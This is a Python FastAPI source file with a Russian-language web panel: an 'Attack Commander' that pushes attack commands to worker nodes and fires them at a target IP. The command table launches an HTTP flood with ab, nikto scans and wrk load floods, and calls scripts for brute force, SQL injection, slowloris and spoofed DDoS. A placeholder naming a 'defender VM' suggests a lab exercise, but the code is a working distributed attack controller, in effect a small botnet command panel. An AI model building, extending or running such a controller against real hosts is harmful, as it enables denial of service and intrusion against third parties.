"""
COMMANDER — главная атакующая нода (atk-1).
Push-модель: командер сам толкает команды воркерам, воркеры ничего не знают о командере.

API:
  GET    /status               — общий статус
  GET    /workers              — список воркеров
  POST   /workers/add          — добавить воркера  {"ip": "..."}
  DELETE /workers/{ip}         — удалить воркера
  POST   /workers/{ip}/run     — атака на конкретном воркере {"attack_type": "..."}
  POST   /workers/{ip}/stop    — остановить конкретного воркера
  POST   /attack/start         — запустить атаку на всех {"attack_type": "...", "target": "..."}
  POST   /attack/stop          — остановить всех
  POST   /target               — установить цель {"target": "..."}
  GET    /ui                   — веб-интерфейс
"""

import os
import sys
import time
import socket
import subprocess
import threading
import logging
import requests
from fastapi import FastAPI
from fastapi.responses import HTMLResponse
import uvicorn

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")
logger = logging.getLogger("commander")

TARGET  = os.getenv("TARGET_IP", "")
PORT    = int(os.getenv("CMD_PORT", 5000))
W_PORT  = int(os.getenv("WORKER_PORT", 5001))

_HERE = os.path.dirname(os.path.abspath(__file__))
A = lambda name: os.path.join(_HERE, "attacks", name)

app = FastAPI(title="Attack Commander")

state = {
    "target":         TARGET,
    "attack_active":  False,
    "current_attack": None,
    "workers": {},
}

current_proc = None


# ─── Локальные атаки командера ────────────────────────────────────────────────
ATTACKS = {
    "flood":     lambda t: ["ab", "-n", "500000", "-c", "300", "-q", f"http://{t}/"],
    "scan":      lambda t: ["nikto", "-h", f"http://{t}", "-maxtime", "120s", "-quiet"],
    "brute":     lambda t: [sys.executable, A("brute.py"), t],
    "sqli":      lambda t: [sys.executable, A("sqli.py"), t],
    "slowloris": lambda t: [sys.executable, A("slowloris.py"), t],
    "flash":     lambda t: ["wrk", "-t4", "-c50", "-d60s", f"http://{t}/"],
    "slow":      lambda t: ["wrk", "-t2", "-c20", "-d60s", f"http://{t}/search"],
    "ddos":      lambda t: [sys.executable, A("ddos_spoof.py"), t],
}


def run_local(attack_type: str, target: str):
    global current_proc
    if current_proc and current_proc.poll() is None:
        current_proc.terminate()
    cmd = ATTACKS.get(attack_type, ATTACKS["flood"])(target)
    logger.info(f"[local] {attack_type} -> {target}")
    try:
        current_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError as e:
        logger.error(f"Команда не найдена: {e}")


def stop_local():
    global current_proc
    if current_proc and current_proc.poll() is None:
        current_proc.terminate()
    current_proc = None


# ─── Управление воркерами (push) ──────────────────────────────────────────────
def push_all(endpoint: str, data: dict | None = None):
    def _send(ip: str):
        try:
            r = requests.post(f"http://{ip}:{W_PORT}/{endpoint}", json=data or {}, timeout=3)
            state["workers"][ip]["status"] = r.json().get("status", "ok")
        except Exception as e:
            state["workers"][ip]["status"] = "offline"
            logger.warning(f"[{ip}] недоступен: {e}")

    threads = [threading.Thread(target=_send, args=(ip,), daemon=True)
               for ip in list(state["workers"])]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=4)


def check_worker(ip: str):
    try:
        r = requests.get(f"http://{ip}:{W_PORT}/status", timeout=2)
        info = r.json()
        state["workers"][ip].update({
            "hostname":       info.get("host", ip),
            "status":         info.get("status", "idle"),
            "current_attack": info.get("current_attack"),
            "last_checked":   time.time(),
        })
    except Exception:
        if ip in state["workers"]:
            state["workers"][ip]["status"] = "offline"


def check_all_workers():
    threads = [threading.Thread(target=check_worker, args=(ip,), daemon=True)
               for ip in list(state["workers"])]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=3)


def _bg_refresh():
    while True:
        time.sleep(5)
        if state["workers"]:
            check_all_workers()


threading.Thread(target=_bg_refresh, daemon=True).start()


# ─── API ─────────────────────────────────────────────────────────────────────
@app.get("/status")
def get_status():
    online = sum(1 for w in state["workers"].values()
                 if w.get("status") not in ("offline", "checking"))
    return {
        "target":         state["target"],
        "attack_active":  state["attack_active"],
        "current_attack": state["current_attack"],
        "workers_total":  len(state["workers"]),
        "workers_online": online,
        "workers":        state["workers"],
    }


@app.get("/workers")
def get_workers():
    return state["workers"]


@app.post("/workers/add")
def add_worker(body: dict):
    ip = (body.get("ip") or "").strip()
    if not ip:
        return {"error": "ip required"}
    if ip not in state["workers"]:
        state["workers"][ip] = {
            "ip":             ip,
            "hostname":       ip,
            "status":         "checking",
            "current_attack": None,
            "last_checked":   0,
        }
        threading.Thread(target=check_worker, args=(ip,), daemon=True).start()
    return {"added": ip, "total": len(state["workers"])}


@app.delete("/workers/{worker_ip}")
def remove_worker(worker_ip: str):
    state["workers"].pop(worker_ip, None)
    return {"removed": worker_ip, "total": len(state["workers"])}


@app.post("/workers/{worker_ip}/run")
def run_single_worker(worker_ip: str, body: dict):
    if worker_ip not in state["workers"]:
        return {"error": "worker not found"}
    attack_type = body.get("attack_type", "flood")
    target      = body.get("target") or state["target"]
    if not target:
        return {"error": "target not set"}
    try:
        requests.post(f"http://{worker_ip}:{W_PORT}/run",
                      json={"attack_type": attack_type, "target": target}, timeout=3)
        state["workers"][worker_ip]["status"]         = "attacking"
        state["workers"][worker_ip]["current_attack"] = attack_type
    except Exception as e:
        state["workers"][worker_ip]["status"] = "offline"
        return {"error": str(e)}
    return {"status": "started", "worker": worker_ip, "attack": attack_type}


@app.post("/workers/{worker_ip}/stop")
def stop_single_worker(worker_ip: str):
    if worker_ip not in state["workers"]:
        return {"error": "worker not found"}
    try:
        requests.post(f"http://{worker_ip}:{W_PORT}/stop", timeout=3)
        state["workers"][worker_ip]["status"]         = "idle"
        state["workers"][worker_ip]["current_attack"] = None
    except Exception as e:
        state["workers"][worker_ip]["status"] = "offline"
        return {"error": str(e)}
    return {"status": "stopped", "worker": worker_ip}


@app.post("/attack/start")
def start_attack(body: dict):
    attack_type = body.get("attack_type", "flood")
    target      = body.get("target") or state["target"]
    if not target:
        return {"error": "target IP not set"}

    state["attack_active"]  = True
    state["current_attack"] = attack_type
    state["target"]         = target

    run_local(attack_type, target)
    push_all("run", {"attack_type": attack_type, "target": target})

    logger.info(f"Атака {attack_type} -> {target} | воркеров: {len(state['workers'])}")
    return {
        "status":           "started",
        "attack":           attack_type,
        "target":           target,
        "workers_notified": len(state["workers"]),
    }


@app.post("/attack/stop")
def stop_attack():
    state["attack_active"]  = False
    state["current_attack"] = None
    stop_local()
    push_all("stop")
    return {"status": "stopped"}


@app.post("/target")
def set_target(body: dict):
    state["target"] = (body.get("target") or state["target"]).strip()
    return {"target": state["target"]}


# ─── Веб-интерфейс ────────────────────────────────────────────────────────────
@app.get("/ui", response_class=HTMLResponse)
def ui():
    return _UI_HTML


_UI_HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Attack Commander</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Courier New', monospace; background: #0e0e0e; color: #bbb;
       padding: 16px; font-size: 13px; }
h1 { color: #e44; margin-bottom: 12px; font-size: 15px; letter-spacing: 1px; }

.topbar { display: flex; gap: 24px; background: #161616; border: 1px solid #2a2a2a;
          padding: 8px 16px; margin-bottom: 12px; font-size: 12px; flex-wrap: wrap; }
.topbar span { color: #555; }
.topbar b { color: #ddd; }
.topbar b.active { color: #fa0; }

.grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 10px; }
.card { background: #161616; border: 1px solid #2a2a2a; padding: 12px; }
.card h3 { font-size: 11px; color: #555; text-transform: uppercase; letter-spacing: 1px;
           margin-bottom: 8px; border-bottom: 1px solid #222; padding-bottom: 4px; }

input, select { width: 100%; background: #1a1a1a; color: #ccc; border: 1px solid #333;
                padding: 6px 8px; font-size: 12px; margin-bottom: 6px;
                font-family: 'Courier New', monospace; }
input:focus, select:focus { outline: none; border-color: #555; }

.btn { background: #1a1a1a; border: 1px solid #0af; color: #0af;
       padding: 5px 12px; cursor: pointer; font-size: 12px; margin: 2px;
       font-family: 'Courier New', monospace; }
.btn:hover { background: #0af; color: #000; }
.btn.red  { border-color: #e44; color: #e44; }
.btn.red:hover  { background: #e44; color: #fff; }
.btn.grn  { border-color: #4c4; color: #4c4; }
.btn.grn:hover  { background: #4c4; color: #000; }
.btn.dim  { border-color: #444; color: #555; }
.btn.full { width: calc(100% - 4px); margin: 6px 2px 0; display: block; }
.atk-grid { display: flex; flex-wrap: wrap; gap: 3px; margin: 6px 0; }

.worker-row { border-bottom: 1px solid #1e1e1e; padding: 8px 0; }
.worker-row:last-child { border-bottom: none; }
.worker-top { display: flex; align-items: center; gap: 8px; margin-bottom: 6px; }
.dot { width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0; }
.s-idle     .dot { background: #4c4; }
.s-attacking .dot { background: #fa0; }
.s-offline  .dot { background: #e44; }
.s-checking .dot { background: #555; }
.wname { color: #ccc; flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
         font-size: 12px; }
.wip { color: #444; font-size: 11px; margin-left: 4px; }
.watk { font-size: 11px; min-width: 70px; text-align: right; color: #fa0; }
.watk.idle { color: #4c4; }
.worker-btns { display: flex; gap: 3px; align-items: center; flex-wrap: wrap; }

#log { height: 90px; overflow-y: auto; background: #0a0a0a; border: 1px solid #1e1e1e;
       padding: 6px 8px; font-size: 11px; color: #666; margin-top: 6px; }
.log-ts { color: #333; }
</style>
</head>
<body>
<h1>ATTACK COMMANDER</h1>

<div class="topbar">
  <span>Цель: <b id="sb-target">—</b></span>
  <span>Глоб. атака: <b id="sb-attack">—</b></span>
  <span>Воркеры: <b id="sb-workers">0/0</b></span>
  <span>Статус: <b id="sb-status">idle</b></span>
</div>

<div class="grid">

  <div class="card">
    <h3>Цель + глобальные атаки (все ноды)</h3>
    <input id="target-ip" placeholder="IP defender VM (напр. 10.129.0.21)">
    <button class="btn grn" onclick="setTarget()">Установить цель</button>
    <div class="atk-grid">
      <button class="btn" onclick="attack('flood')">HTTP Flood</button>
      <button class="btn" onclick="attack('ddos')">DDoS Spoof</button>
      <button class="btn" onclick="attack('scan')">Nikto Scan</button>
      <button class="btn" onclick="attack('brute')">Brute Force</button>
      <button class="btn" onclick="attack('sqli')">SQL Inject</button>
      <button class="btn" onclick="attack('slowloris')">Slowloris</button>
      <button class="btn" onclick="attack('flash')">Flash Crowd</button>
      <button class="btn" onclick="attack('slow')">Slow Flood</button>
    </div>
    <button class="btn red full" onclick="stopAll()">СТОП — все ноды</button>
  </div>

  <div class="card">
    <h3>Воркеры <span id="w-count" style="color:#444">(0)</span></h3>
    <input id="worker-ip" placeholder="IP воркера (напр. 89.169.x.x)">
    <button class="btn grn" onclick="addWorker()">+ Добавить</button>
    <div id="workers-list" style="margin-top:8px">
      <span style="color:#444;font-size:11px">Нет воркеров</span>
    </div>
  </div>

</div>

<div class="card">
  <h3>Лог</h3>
  <div id="log"></div>
</div>

<script>
const B = window.location.origin;
const ATK = ['flood','ddos','scan','brute','sqli','slowloris','flash','slow'];

function ts() { return new Date().toLocaleTimeString(); }
function log(msg, color) {
  const d = document.getElementById('log');
  d.innerHTML = '<span class="log-ts">['+ts()+']</span> '
    +'<span style="color:'+(color||'#8af')+'">'+msg+'</span><br>' + d.innerHTML;
}

async function setTarget() {
  const t = document.getElementById('target-ip').value.trim();
  if (!t) { log('Введи IP цели', '#e44'); return; }
  try {
    await fetch(B+'/target', {method:'POST', headers:{'Content-Type':'application/json'},
      body:JSON.stringify({target:t})});
    log('Цель установлена: '+t, '#4c4');
    refresh();
  } catch(e) { log('Ошибка: '+e.message, '#e44'); }
}

async function addWorker() {
  const ip = document.getElementById('worker-ip').value.trim();
  if (!ip) { log('Введи IP воркера', '#e44'); return; }
  log('Добавляю: '+ip, '#888');
  try {
    const r = await fetch(B+'/workers/add', {method:'POST',
      headers:{'Content-Type':'application/json'}, body:JSON.stringify({ip})});
    if (!r.ok) { log('HTTP '+r.status+' от API', '#e44'); return; }
    const d = await r.json();
    if (d.error) { log('ERR: '+d.error, '#e44'); return; }
    document.getElementById('worker-ip').value = '';
    log('Воркер добавлен: '+ip, '#4c4');
    refresh();
  } catch(e) {
    log('Нет связи с commander API: '+e.message, '#e44');
  }
}

async function removeWorker(ip) {
  try {
    await fetch(B+'/workers/'+encodeURIComponent(ip), {method:'DELETE'});
    log('Воркер удалён: '+ip, '#e44');
    refresh();
  } catch(e) { log('Ошибка: '+e.message, '#e44'); }
}

async function attack(type) {
  const target = document.getElementById('target-ip').value.trim();
  log('Запускаю '+type+' на всех...', '#888');
  try {
    const r = await fetch(B+'/attack/start', {method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({attack_type:type, target:target||undefined})});
    const d = await r.json();
    if (d.error) { log('ERR: '+d.error, '#e44'); return; }
    log('ALL >> '+type+' -> '+d.target+' (нод: '+d.workers_notified+')', '#fa0');
  } catch(e) { log('Ошибка: '+e.message, '#e44'); }
}

async function stopAll() {
  try {
    await fetch(B+'/attack/stop', {method:'POST'});
    log('СТОП — все ноды', '#e44');
  } catch(e) { log('Ошибка: '+e.message, '#e44'); }
}

async function runWorker(ip) {
  const sel = document.getElementById('sel-'+ip);
  const type = sel ? sel.value : 'flood';
  const target = document.getElementById('target-ip').value.trim();
  log('Запускаю '+type+' на '+ip, '#888');
  try {
    const r = await fetch(B+'/workers/'+encodeURIComponent(ip)+'/run',
      {method:'POST', headers:{'Content-Type':'application/json'},
       body:JSON.stringify({attack_type:type, target:target||undefined})});
    const d = await r.json();
    if (d.error) { log('ERR ['+ip+']: '+d.error, '#e44'); return; }
    log('['+ip+'] >> '+type, '#fa0');
  } catch(e) { log('Ошибка ['+ip+']: '+e.message, '#e44'); }
}

async function stopWorker(ip) {
  try {
    await fetch(B+'/workers/'+encodeURIComponent(ip)+'/stop', {method:'POST'});
    log('['+ip+'] остановлен', '#888');
  } catch(e) { log('Ошибка: '+e.message, '#e44'); }
}

function sCls(s) {
  return 's-'+({'attacking':'attacking','offline':'offline','checking':'checking'}[s]||'idle');
}

async function refresh() {
  try {
    const r = await fetch(B+'/status');
    const d = await r.json();

    document.getElementById('sb-target').textContent  = d.target || '—';
    document.getElementById('sb-attack').textContent  = d.current_attack || '—';
    document.getElementById('sb-workers').textContent = d.workers_online+'/'+d.workers_total;
    const se = document.getElementById('sb-status');
    se.textContent = d.attack_active ? (d.current_attack||'active') : 'idle';
    se.className   = d.attack_active ? 'active' : '';

    if (!document.getElementById('target-ip').value && d.target)
      document.getElementById('target-ip').value = d.target;

    const keys = Object.keys(d.workers);
    document.getElementById('w-count').textContent = '('+keys.length+')';
    const wl = document.getElementById('workers-list');

    if (!keys.length) {
      wl.innerHTML = '<span style="color:#444;font-size:11px">Нет воркеров</span>';
      return;
    }

    const saved = {};
    keys.forEach(ip => { const s = document.getElementById('sel-'+ip); if(s) saved[ip]=s.value; });

    wl.innerHTML = keys.map(ip => {
      const w = d.workers[ip];
      const s  = w.status || 'checking';
      const atk = w.current_attack;
      const name = (w.hostname && w.hostname !== ip) ? w.hostname : ip;
      const opts = ATK.map(t => '<option value="'+t+'">'+t+'</option>').join('');
      const atkLabel = atk || s;
      const atkCls   = atk ? '' : ' idle';
      return '<div class="worker-row '+sCls(s)+'">'
        +'<div class="worker-top">'
        +'<div class="dot"></div>'
        +'<div class="wname">'+name+'<span class="wip">'+ip+'</span></div>'
        +'<div class="watk'+atkCls+'">'+atkLabel+'</div>'
        +'</div>'
        +'<div class="worker-btns">'
        +'<select id="sel-'+ip+'" style="width:auto;flex:none;padding:3px 6px;margin:0">'+opts+'</select>'
        +'<button class="btn" style="padding:3px 10px" onclick="runWorker(\''+ip+'\')">Run</button>'
        +'<button class="btn dim" style="padding:3px 10px" onclick="stopWorker(\''+ip+'\')">Stop</button>'
        +'<button class="btn red" style="padding:3px 8px" onclick="removeWorker(\''+ip+'\')">X</button>'
        +'</div>'
        +'</div>';
    }).join('');

    keys.forEach(ip => { const s=document.getElementById('sel-'+ip); if(s&&saved[ip]) s.value=saved[ip]; });
  } catch(e) { /* API temporarily unavailable */ }
}

setInterval(refresh, 3000);
refresh();
</script>
</body>
</html>"""


if __name__ == "__main__":
    my_ip = socket.gethostbyname(socket.gethostname())
    logger.info(f"Commander ready — http://{my_ip}:{PORT}/ui")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="warning")
